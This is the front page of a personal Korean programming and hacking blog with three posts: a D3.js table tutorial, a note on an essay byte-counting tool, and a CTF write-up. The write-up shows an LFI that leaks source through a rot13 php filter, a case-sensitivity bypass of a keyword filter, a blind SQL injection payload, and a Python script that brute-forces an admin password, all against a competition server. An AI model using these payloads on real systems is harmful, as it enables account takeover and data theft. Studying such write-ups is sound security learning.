<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      G40N &middot; blog
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/lanyon.css">
  <link rel="stylesheet" href="/public/css/svg-icons.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body class = "theme-base-10">

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>The blog about Hacking, Programming, Anime, etc.</p>
    <a href="https://github.com/GAONNR" target="_blank">
			<i class="svg-icon svg-icon-github"></i>
		</a>
		<a href="https://facebook.com/gaon0403" target="_blank">
			<i class="svg-icon svg-icon-facebook"></i>
		</a>
		<a href="https://twitter.com/_gaonnr_" target="_blank">
			<i class="svg-icon svg-icon-twitter"></i>
		</a>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="/">Home</a>

    

    
    
      
        
        
      
    
      
        
        
      
    
      
        
          <a class="sidebar-nav-item" href="/about/">About</a>
        
        
      
    
      
        
          <a class="sidebar-nav-item" href="/archive/">Archive</a>
        
        
      
    
      
    
      
        
        
      
    
      
        
        
      
    
      
        
        
      
    
      
        
        
      
    
      
    

    
    <!--
    <a class="sidebar-nav-item" href="/archive/v1.0.0.zip">Download</a>
    <a class="sidebar-nav-item" href="">GitHub project</a>
    -->
    <span class="sidebar-nav-item">Currently v1.0.0</span>
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2017. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">G40N</a>
            <small>blog</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="posts">
  
  <div class="post">
    <h1 class="post-title">
      <a href="/development/2017/02/15/d3-study/">
        D3를 통한 차트 제작 스터디
      </a>
    </h1>

    <span class="post-date">15 Feb 2017</span>

    <p><img src="/images/D3/d3_logo.png" alt="" /><br />
<a href="https://d3js.org">D3</a>는 기본적으로 array형태로 묶인 데이터를 각각의 요소에 바인딩하고, 바인딩된 데이터를 통해 각 요소에 작업을 수행하는 라이브러리이다. 따라서, D3으로 차트를 만드는 모든 과정은 다음과 같은 과정을 거친다:<br />
<code class="highlighter-rouge">데이터를 바인딩할 element 선택 -&gt; 데이터 바인딩 -&gt; element가 대응되지 않는 데이터들에 진입 -&gt; 데이터에 기반한 요소 추가 작업</code><br />
여기서, 처음 차트를 생성할 때는 첫 단계에서 선택되는 데이터는 아무것도 없는 경우가 많다. 즉, 아무것도 없는(이제 element가 추가될) 빈 공간을 D3 selector를 통해 선택하고, 데이터를 바인딩한 후, 데이터 array 안에 존재하는 각각의 값을 이용하여 원하는 속성을 가지는 element를 하나하나 추가하는 방식으로 차트를 제작하는 방식이 보편적이라 할 수 있다.</p>

<p>예를 들어, 다음과 같은 표를 제작하려 한다고 하자.</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">name</th>
      <th style="text-align: center">size(GB)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">C:</td>
      <td style="text-align: center">128</td>
    </tr>
    <tr>
      <td style="text-align: center">D:</td>
      <td style="text-align: center">512</td>
    </tr>
    <tr>
      <td style="text-align: center">E:</td>
      <td style="text-align: center">16</td>
    </tr>
    <tr>
      <td style="text-align: center">F:</td>
      <td style="text-align: center">8</td>
    </tr>
    <tr>
      <td style="text-align: center">G:</td>
      <td style="text-align: center">8</td>
    </tr>
  </tbody>
</table>

<p>먼저, 이 표를 구성하는 데이터를 입력받아야 한다. D3는 csv등의 다양한 포맷을 지원하지만, 결국 중요한 것은 최종적으로 Array 형태의 데이터를 만드는 것이다.<br />
데이터가 csv파일이라면, 다음과 같이 구성되어 있을 것이다:</p>

<p><code class="highlighter-rouge">javascript
"name","size(GB)"
"C:",128
"D:",512
"E:",16
"F:",8
"G:",8
</code></p>

<p>이를 받아서 Array의 형태의 data를 생성하는 코드는 다음과 같다:</p>

<p>```javascript
d3.csv(‘data.csv’, function(error, data) {
  data.forEach(function (d, i) {
    d.name = d.name; // meaningless code
    d.size = +d.size;
  });</p>

<p>// callback function
  draw(data);
});
```</p>

<p><code class="highlighter-rouge">d3.csv()</code>함수는 첫 번째 argument의 string을 path로서 사용하여 해당 경로의 csv파일을 읽어들인 후 array로 변환하고, 이를 두 번재 argument로 설정된 함수에 data로서 넘긴다. 즉, 경로만 맞게 입력된다면 <code class="highlighter-rouge">d3.csv()</code>함수를 실행시키는 것만으로도 다음과 같은, Object들의 Array가 완성된다.</p>

<p><code class="highlighter-rouge">javascript
[{
  'name': 'C:',
  'size': '128'
},
{
  'name': 'D:',
  'size': '512'
},
/* ... */
]
</code></p>

<p>이것만으로도 표를 구성하는 데에는 문제가 없지만, 만약 받아들인 데이터에 추가적인 작업을 하고 싶다면(예를 들어, size를 MB로 변환하고 싶다던가), forEach 함수를 활용하여 데이터를 수정할 수 있다. 위 코드에서는, <code class="highlighter-rouge">d.size = +d.size</code>라는 코드를 통해 문자열로 받아들여지는 size값을 숫자로 바꾸었다. (forEach에 argument로 반드시 d, i를 적을 필요는 없지만, D3의 Example 코드들을 보면, 많은 코드들이 암묵적으로 익명함수에 전달되는 argument를 d, i로 설정한다)</p>

<p>데이터를 로드하는 과정은 비동기적으로 이루어지기 때문에, <code class="highlighter-rouge">d3.csv()</code> 뒤에 있는 코드라인들은 데이터가 다 로드되지 않아도 계속해서 실행된다. 따라서, 데이터가 다 로드된 다음 테이블을 그릴 수 있도록 하려면, 함수의 인자로 전달된 익명함수의 끝에 콜백 함수를 지정해 주어야 한다. 여기서는 <code class="highlighter-rouge">draw()</code>함수가 바깥에 선언되어 있다고 가정하고, 그 함수를 호출하여 표를 그릴 수 있도록 하였다.</p>

<p>이제 표를 그리는 draw()함수를 살펴보면, 다음과 같은 구조를 띄고 있을 것이다.</p>

<p>```javascript
columns = [‘name’, ‘size’];</p>

<p>function draw(data) {
  var table = d3.select(‘#div-for-table’)
    .append(‘table’)
    .attr(‘class’, ‘table’);</p>

<p>var thead = table.append(‘thead’)
    .attr(‘class’, ‘thead’)
    .append(‘tr’)
    .selectAll(‘th’)
    .data(columns)
    .enter()
    .append(‘th’)
    .text(function(col) {
      return col;
    });</p>

<p>var tbody = table.append(‘tbody’)
    .selectAll(‘tr’)
    .data(data)
    .enter()
    .append(‘tr’);</p>

<p>var cells = tbody.selectAll(‘td’)
    .data(function (row, i) {
      return columns.map(function (col) {
        return row[col];
      });
    })
    .enter()
    .append(‘td’)
    .text(function(d) {
      return d;
    });
}
```</p>

<p>처음의 <code class="highlighter-rouge">table</code>변수를 선언하면서 이루어지는 작업은 다음과 같다. 먼저, d3 selector로 table이 들어가게 될 공간을 선택한다. (d3 selector는 jquery와 기능이 거의 유사하다) 그 후, 그 자식 element로 <code class="highlighter-rouge">&lt;table&gt;</code>을 추가하고, <code class="highlighter-rouge">'table'</code>이라는 class를 부여한다. 이 모든 과정은 코드에서 보이는 바와 같이 함수형 프로그래밍과 유사하게 짜여질 수 있다.</p>

<p>다음의 <code class="highlighter-rouge">thead</code>는 선언되면서 <code class="highlighter-rouge">&lt;table&gt;</code>에 <code class="highlighter-rouge">th</code>들을 추가한다. 먼저 위에서 선언된 <code class="highlighter-rouge">table</code> variable 안에 <code class="highlighter-rouge">&lt;thead&gt;</code> element를 추가하고 <code class="highlighter-rouge">'thead'</code> class를 부여한다. 거기에 다시 <code class="highlighter-rouge">&lt;tr&gt;</code> element를 추가하고, 그 안에서 <code class="highlighter-rouge">selectAll()</code>함수로 모든 <code class="highlighter-rouge">&lt;th&gt;</code> element를 선택한다. 이 때, <code class="highlighter-rouge">&lt;tr&gt;</code>안에는 아직 어떤 element도 들어가 있지 않으므로, 아무것도 선택되지 않게 되는데, 이 다음부터가 차트를 만드는 과저의 핵심이다. 이 선택된 element들에게 <code class="highlighter-rouge">data()</code>함수로 data array를 1:1로 바인딩한다. 그런데 <code class="highlighter-rouge">selectAll()</code>함수로는 아무것도 선택되지 않은 상태이기 때문에, 데이터의 전부가 매칭되지 않고 남게 된다. 바로 이 때, <code class="highlighter-rouge">enter()</code>함수가 사용된다.</p>

<p>이 함수는 <strong>매칭(바인딩)되지 않은 데이터에 하나하나씩 접근해, 그 데이터에 대해 동작을 수행할 수 있게 한다.</strong> 바인딩되지 않은 데이터들에 대한 <code class="highlighter-rouge">forEach()</code> 함수라고 보면 되겠다.</p>

<p>이제 <code class="highlighter-rouge">enter()</code>함수를 통해 각각의 데이터들에 진입한 상태인데, 뒤에 <code class="highlighter-rouge">.append('th').text(...)</code> 코드가 있으므로 각각의 데이터에 대해 <code class="highlighter-rouge">&lt;th&gt;</code> element가 추가된다. 즉, <code class="highlighter-rouge">columns</code>에 들어 있는 원소의 개수(2개)만큼의 <code class="highlighter-rouge">&lt;th&gt;</code>가 추가된다. enter함수는 뒤에 오는 함수들에게 인자로 지금의 데이터와 인덱스를 넘겨줄 수 있는데, 이 코드에서는 <code class="highlighter-rouge">text()</code> 함수 내부의 익명 함수가 <code class="highlighter-rouge">col</code>으로 데이터(문자열 ‘name’과 ‘size’)를 받아 그 값을 반환한다. 최종적으로, 각각 <code class="highlighter-rouge">'name'</code>과 <code class="highlighter-rouge">'size'</code>라는 문자열을 표시하는 <code class="highlighter-rouge">&lt;th&gt;</code> element가 <code class="highlighter-rouge">&lt;tr&gt;</code> 내부에 추가된다.</p>

<p><code class="highlighter-rouge">tbody</code>도 위와 비슷한 역할을 하는데, 다른 점이 있다면 바인딩하는 데이터가 csv파일에서 직접 뽑아낸 데이터라는 것과, <code class="highlighter-rouge">&lt;thead&gt;&lt;tr&gt;</code>에 <code class="highlighter-rouge">&lt;th&gt;</code>를 추가하는 대신 <code class="highlighter-rouge">&lt;tbody&gt;</code> 안에 data의 길이와 같은 개수의 <code class="highlighter-rouge">&lt;tr&gt;</code>을 추가한다는 것이다.</p>

<p><code class="highlighter-rouge">cells</code>의 경우, 위에서 선언된 tbody 안에 진입하여 <code class="highlighter-rouge">&lt;td&gt;</code>원소를 추가한다. 이때, 바인딩하는 데이터는 이미 각각의 row에 바인딩된 데이터를 기반으로 주어지는데, 만약 어떤 row에 바인딩된 데이터가 <code class="highlighter-rouge"><span class="p">{</span><span class="err">'name':</span><span class="w"> </span><span class="err">'C:',</span><span class="w"> </span><span class="err">'size':</span><span class="w"> </span><span class="err">128</span><span class="p">}</span></code>이라면, 익명 함수에 의해 반환되는 데이터는 <code class="highlighter-rouge">['C:', 128]</code>로서, 이 데이터를 토대로 <code class="highlighter-rouge">&lt;td&gt;</code>, 즉 table 각각의 row 내부의 cell이 추가된다.</p>

<p>모든 작업이 끝나면 다음과 같은 html코드가 생성되며, 이는 우리가 만들려 한 표와 같은 구조를 이룰 것이다. 적당한 css파일을 갖고 있다면, 표의 각 원소에 적절한 class나 style을 줌으로써 표의 외양을 바꿀 수도 있다.</p>

<p>```html</p>
<table class="table">
  <thead class="thead">
    <tr>
      <th>name</th>
      <th>size(GB)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>C:</td>
      <td>128</td>
    </tr>
    <tr>
      <td>D:</td>
      <td>512</td>
    </tr>
    <tr>
      <td>E:</td>
      <td>16</td>
    </tr>
    <tr>
      <td>F:</td>
      <td>8</td>
    </tr>
    <tr>
      <td>G:</td>
      <td>8</td>
    </tr>
  </tbody>
</table>
<p>```</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/hacking/2016/09/24/kapo-writeup/">
        2016 Kaist - Postech Science War Writeup (wargame_easy | Web 200pt)
      </a>
    </h1>

    <span class="post-date">24 Sep 2016</span>

    <p>처음으로 쓰는 Writeup이다!</p>

<p>Web계열의 200점(확실하지 않음)짜리 문제인 <a href="http://chall.pwn-with.me">wargame_easy</a>이다.</p>

<p align="CENTER">
  <img src="/images/2016_09/kapo16/main1.png" style="width: 640px;" />
</p>

<p>링크를 타고 들어가면, 환영 문구와 함께 ‘Login’ ‘Register’ 두 개의 메뉴가 보인다.<br />
Register 메뉴를 통해 사이트에 가입한 후 로그인하면 다음과 같은 화면이 나온다.</p>

<p align="CENTER">
  <img src="/images/2016_09/kapo16/main2.png" style="width: 640px;" />
</p>

<p>Prob, Auth, Rank 등의 메뉴로 미루어 보건데 CTF사이트를 모티브로 만들어진 사이트이다.<br />
실제로 Prob에 적혀있는 키를 Auth에 넣어 보니 점수가 올라가 Rank에 반영되는 것을 확인할 수 있었다.</p>

<p>rank 메뉴에 진입했을 때의 URL이 <code class="highlighter-rouge">http://chall.pwn-with.me/?page=rank</code>이므로, LFI 취약점이 존재할 것으로 생각된다.<br />
이를 이용해서 php filer로 base64 인코딩된 소스를 얻으려 했으나, 소스 보기를 했을 경우 detected라는 문구밖에 보이지 않는다. page 뒤의 argument에 특정 단어가 삽임되었을 경우 이를 필터랑하고 detected를 출력하도록 프로그램되었을 것을 예상할 수 있다.</p>

<p>다른 php filter를 이용한 시도 결과, <code class="highlighter-rouge">php://filter/read=string.rot13/resource=</code>가 filtering에 걸리지 않음을 확인할 수 있었고, 이를 통해 login, register, rank, info 페이지의 소스를 13칸 밀린 caesar cipher의 형태로 알아낼 수 있었다.<br />
이를 복호화한 결과는 다음과 같다. (당시 toUpper 함수를 사용하여, 모든 소스가 대문자로 이루어져 있다)</p>

<p align="CENTER">
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainIndex.php">index.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainLogin.php">login.php</a>&nbsp; &nbsp; &nbsp; &nbsp;
  <a href="https://github.com/GAONNR/Kapo2016/blob/master/plainInfo.php">info.php</a>
</p>

<p>먼저 주목해야 할 것은 info페이지의 19 ~ 35번 라인이다.</p>

<p><code class="highlighter-rouge">php
&lt;?PHP
  IF($_POST){
    IF($_SESSION[ID] == 'ADMIN') EXIT();
    IF($_POST[PW] == ""){
      ECHO "&lt;SCRIPT&gt;ALERT('INPUT YOUR PASSWORD.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
      EXIT();
    }
    IF(STRLEN($_POST[PW]) &gt; 32){
      ECHO "&lt;SCRIPT&gt;ALERT('CAN'T CREATE PASSWORD BIGGER THAN 32 BYTES.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
      EXIT();
    }
    $_POST[PW] = ADDSLASHES($_POST[PW]);
    $SQL = "UPDATE MEMBER SET PW = '$_POST[PW]' WHERE ID = '$_SESSION[ID]'";
    $Q = @MYSQL_QUERY($SQL);
    ECHO "&lt;SCRIPT&gt;ALERT('PW CHANGED.');LOCATION.HREF='?PAGE=INFO';&lt;/SCRIPT&gt;";
  }
?&gt;
</code></p>

<p>info 페이지는 사용자의 비멀번호를 변경할 수 있는 페이지인데, 세 번째 줄의 <code class="highlighter-rouge">IF($_SESSION[ID] == 'ADMIN') EXIT();</code>에 의해 서버에 admin이 등록되어 있으며, admin 계정의 비밀번호 변경을 막고 있음을 알 수 있다. 따라서 admin계정의 비밀번호를 알아내는 것을 목표로 정하고 다음 과정을 진행하였다.</p>

<p>다음으로 login 페이지의 12 ~ 35번 라인에서 공격 방식에 대한 힌트를 찾을 수 있었다.</p>

<p><code class="highlighter-rouge">php
&lt;?PHP
	IF($_POST){
		IF($_SESSION[ID]){
			ECHO "&lt;SCRIPT&gt;ALERT('YOU HAVE ALREADY LOGGED IN.');HISTORY.GO(-1);&lt;/SCRIPT&gt;";
			EXIT();
		}
		$SQL = "SELECT * FROM MEMBER WHERE ID = '".TRIM($_POST[ID])."'";
		$RESULT = @MYSQL_QUERY($SQL);
		$DATA = @MYSQL_FETCH_ARRAY($RESULT);
		IF($DATA[ID]){
			IF($_POST[PW] == $DATA[PW]){
				$_SESSION[ID] = $DATA[ID];
				ECHO "&lt;SCRIPT&gt;ALERT('HELLO $_SESSION[ID]');LOCATION.HREF='./';&lt;/SCRIPT&gt;";
			}ELSE{
				ECHO "&lt;SCRIPT&gt;HISTORY.GO(-1);&lt;/SCRIPT&gt;";
				EXIT();
			}
		}ELSE{
			ECHO "&lt;SCRIPT&gt;HISTORY.GO(-1);&lt;/SCRIPT&gt;";
			EXIT();
		}
	}
?&gt;
</code></p>

<p>공격 방식으로 SQL Injection이 유효함을 (매우 쉽게) 알 수 있다.</p>

<p>이제 index 페이지의 75 ~ 80번 라인을 보면,</p>

<p><code class="highlighter-rouge">php
&lt;?PHP
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&gt;|&lt;|,|\*|!|\.\./",IMPLODE($_GET))) EXIT("DETECTED");
	IF(PREG_MATCH("/CONVERT|BASE64|DATA|UNION|SELECT|FROM|WHERE|SLEEP|BENCH|JOIN|CHAR|INFOR|SCHEMA|COLUMNS|LIKE|#|\)|\(|&gt;|&lt;|,|\*|!|\.\./",IMPLODE($_POST))) EXIT("DETECTED");
	IF(ISSET($_GET[PAGE])){
		INCLUDE($_GET[PAGE].".PHP");
	}ELSE{
?&gt;
</code></p>

<p>base64, select 등의 많은 구문을 입력에서 걸러내고 있음을 알 수 있다. 처음 LFI를 시도할 때, base64 filter가 detected된 것도 이 코드에 의해서임을 파악할 수 있었다.</p>

<p>처음에는 Time-based Blind SQL Injecton으로 공격을 시도하려 했으나, <code class="highlighter-rouge">sleep</code>, <code class="highlighter-rouge">bench</code>등의 중요한 함수들이 필터링되고, 결정적으로 괄호 <code class="highlighter-rouge">(</code>, <code class="highlighter-rouge">)</code>들이 필터링되어 불가능하다고 판단되었다.  괄호가 막혔기 때문에 목록에 없는 함수를 사용하는 것도 거의 불가능했다.</p>

<p>그러나 곧 위 코드의 치명적인 취약점을 찾아낼 수 있었는데, 그것은 <code class="highlighter-rouge">preg_match</code>함수의 첫 번째 argument string 뒤에 <code class="highlighter-rouge">i</code>가 붙지 않았다는 것이었다. 이는 preg_match에서 대소문자를 구별하여 받아들인다는 것을 뜻하고, SQL은 구문의 대소문자를 구별하지 않으므로, 이를 이용하여 필터링을 아주 간단하게 우회할 수 있었다. 예를 들어 <code class="highlighter-rouge">like</code>를 SQL 구문에 포함시키고 싶다면, <code class="highlighter-rouge">like</code> 대신 <code class="highlighter-rouge">LikE</code>라고 쓰면 필터링을 우회하여 서버에 그대로 구문을 보낼 수 있게 된다.</p>

<p>이에 착안하여 다음과 같은 payload를 만들 수 있었다.</p>

<p><code class="highlighter-rouge">fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a</code></p>

<p>이를 login의 id에 넣으면 다음과 같은 SQL Query가 완성된다.</p>

<p><code class="highlighter-rouge">sql
SELECT * FROM MEMBER WHERE ID = 'fqwrlqwrhqwklhflqfi123123' or CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END or id='godj3' order by id asc -- a
</code></p>

<p>괄호가 필터링됨으로 인해 if, substr등의 함수를 사용할 수 없었으므로, 그 대신에 case when과 like를 활용하여 비슷한 역할을 하는 구문을 만들 수 있었다.</p>

<p>ID로 들어가는 <code class="highlighter-rouge">fqwrlqwrhqwklhflqfi123123</code>은 서버에 등록되어 있지 않은 id이므로, 언제나 거짓을 반환한다. 그 후 <code class="highlighter-rouge">CASE WHEN id='admin' AND pw LikE 'a%' THEN TRUE ELSE FALSE END</code>를 만나게 되는데, 만약 admin의 pw가 a로 시작한다면 TRUE를, 아니라면 FALSE를 반환한다. 만약 FALSE라면, 뒤의 구문에 의해 <code class="highlighter-rouge">godj3</code>을 id로서 불러오게 되고, pw부분에 미리 만들어 둔 godj3 계정의 비밀번호를 입력해 두면 godj3계정으로 로그인된다. 만약 admin의 pw가 a로 시작한다면, 미리 입력해 둔 godj3 계정의 비밀번호와 admin의 비밀번호는 맞지 않을 것이므로 로그인에 실패하게 된다. 이를 이용하여 admin의 password를 알아내는 프로그램을 짤 수 있다.</p>

<p align="CENTER">
	<a href="https://github.com/GAONNR/Kapo2016/blob/master/login.py">login.py</a>
</p>

<p>```python
import requests
import string</p>

<p>baseurl = ‘http://chall.pwn-with.me/?page=login’</p>

<p>def postData(id, pw):
    params = {‘id’: id, ‘pw’: pw}
    res = requests.post(baseurl, data = params)</p>

<div class="highlighter-rouge"><pre class="highlight"><code>#print res.text
if res.text.find('Hello') &gt; 0:
    return True
else:
    return False
</code></pre>
</div>

<h1 id="print-postdatafqwrlqwrhqwklhflqf-or-ifidadmin-and-0-1-0-or-nameguest-order-by-name-asc----a-guest">print postData(‘'’fqwrlqwrhqwklhflqf’ or if(id=’admin’ and 0, 1, 0) or name=’guest’ order by name asc – a’’’, ‘guest’)</h1>

<p>print postData(“fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND FALSE THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”, ‘godj3’)</p>

<p>print postData(‘godj3’, ‘godj3’)</p>

<p>print postData(“sadawqoeqweqnnncxma’ or id=’godj3’ – a”, ‘godj3’)</p>

<p>payload = “fqwrlqwrhqwklhflqfi123123’ or CASE WHEN id=’admin’ AND pw LikE ‘”</p>

<p>payend = “%’ THEN TRUE ELSE FALSE END or id=’godj3’ order by id asc – a”</p>

<p>key = ‘’</p>

<p>for k in range(100):
    check = False
    for i in string.printable:
        if i == ‘_’ or i == ‘!’ or i == ‘#’ or i == ‘%’ or i == ‘'’ or i == ‘"’ or i == ‘(‘ or i == ‘)’ or i == ‘*’ or i == ‘+’ or i == ‘-‘ or i == ‘&amp;’ or i == ‘|’ or i == ‘&gt;’ or i == ‘&lt;’ or i == ‘=’ or i == ‘?’ or i == ‘~’ or i == ‘,’:
            continue
        # print key + i,
        # print postData(payload + i + payend, ‘godj3’)
        if not postData(payload + key + i + payend, ‘godj3’):
            print key + i
            key = key + i
            check = True
            break</p>

<div class="highlighter-rouge"><pre class="highlight"><code>if check == False:
    key += '_' ```
</code></pre>
</div>

<p>flag: <code class="highlighter-rouge">kapo{j.s.bach_french_suites}</code></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="/development/2016/09/13/jagisogae/">
        자기소개서 글자 수 (Byte수) 카운팅 프로그램
      </a>
    </h1>

    <span class="post-date">13 Sep 2016</span>

    <p>고등학교 2학년 때, 대입 원서를 쓸 당시 너무나도 딴짓이 하고 싶었던 나머지 자기 소개서의 글자 수를 세 주는 프로그램을 만들었는데, 어쩌다 보니 다음 해, 다다음 해에도 이 프로그램을 찾아주는 후배님들이 계셔서, 몇 달 전에 웹 페이지를 따로 제작하여 프로그램에 대한 정리와 함께 올려 두었다.</p>

<p>당시 하나도 모르던 C#(지금도 하나도 모른다)을 여기저기 구글링하면서 짠 프로그램이라, 꽤 엉성하다.</p>

<p><a href="http://jagi.gaonnr.me">자기소개서 글자 수 세기</a></p>

<p align="CENTER">
  <img src="/images/2016_09/jagi_count.png" style="width: 640px;" />
</p>

  </div>
  
</div>

<div class="pagination">
  
    <a class="pagination-item older" href="/page2">Older</a>
  
  
    <span class="pagination-item newer">Newer</span>
  
</div>

      </div>
    </div>

    <label for="sidebar-checkbox" class="sidebar-toggle"></label>

    <script>
      (function(document) {
        var toggle = document.querySelector('.sidebar-toggle');
        var sidebar = document.querySelector('#sidebar');
        var checkbox = document.querySelector('#sidebar-checkbox');

        document.addEventListener('click', function(e) {
          var target = e.target;

          if(!checkbox.checked ||
             sidebar.contains(target) ||
             (target === checkbox || target === toggle)) return;

          checkbox.checked = false;
        }, false);
      })(document);
    </script>
  </body>
</html>
